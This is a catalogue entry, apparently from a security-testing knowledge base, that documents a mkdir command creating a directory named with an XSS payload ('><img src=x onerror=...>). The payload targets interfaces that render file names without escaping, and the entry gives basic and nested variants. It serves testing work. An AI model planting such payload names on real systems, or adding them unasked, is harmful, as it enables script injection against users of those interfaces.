---
id: cmd-uuid-3
data: 'mkdir ''><img src=x onerror=javascript:alert("xss2")>'''
tags:
  - directory-creation
  - xss
type: command
output: null
executor: bash
platforms:
  - Linux
created_at: '2023-10-01T00:00:00Z'
updated_at: '2025-12-14T03:15:26.338Z'
verified: false
validated: true
submitted: true
---
---

# mkdir '><img src=x onerror=javascript:alert("xss2")>'

## Command

```bash
mkdir '><img src=x onerror=javascript:alert("xss2")>'
```

## Description

Creates a new directory with a name containing an XSS payload variant, targeting the same vulnerability in name rendering.

## Parameters

| Parameter | Description | Required |
|-----------|-------------|----------|
| `'><img src=x onerror=javascript:alert("xss2")>'` | Directory name with quoted payload | Yes |

## Examples

### Basic Usage

```bash
mkdir '><img src=x onerror=javascript:alert("xss2")>'
```

### Advanced Usage

```bash
mkdir -p '><img src=x onerror=javascript:alert("xss2")>'/sub  # Create nested
```

## Expected Output

No output; directory created and visible via `ls`.

## Related

- [[commands/touch-xss-file]]
- [[procedures/Create-Malicious-XSS-Directory]]

